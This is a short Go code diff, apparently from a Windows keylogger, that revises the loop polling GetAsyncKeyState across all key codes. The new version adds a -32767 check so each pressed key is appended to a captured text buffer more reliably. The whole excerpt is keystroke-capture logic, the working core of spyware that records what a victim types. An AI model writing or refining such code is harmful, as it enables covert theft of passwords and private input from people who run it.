@@ -80,16 +80,14 @@ func key() (err error) {
     for i := 0; i < 0xFF; i++ {
         asynch, _, _ := procGetAsyncKeyState.Call(uintptr(i))
 
-        // Ignore the least significant bit
-        if asynch&0x1 == 0 {
-            continue
+        if (int(asynch) == -32767) || (asynch&0x1 != 0) {
+
+            // Update append text value
+            text += value(i)
+
+            // Reset timeout
+            timeout = 0
         }
-
-        // Update append text value
-        text += value(i)
-
-        // Reset timeout
-        timeout = 0
 
     }
 
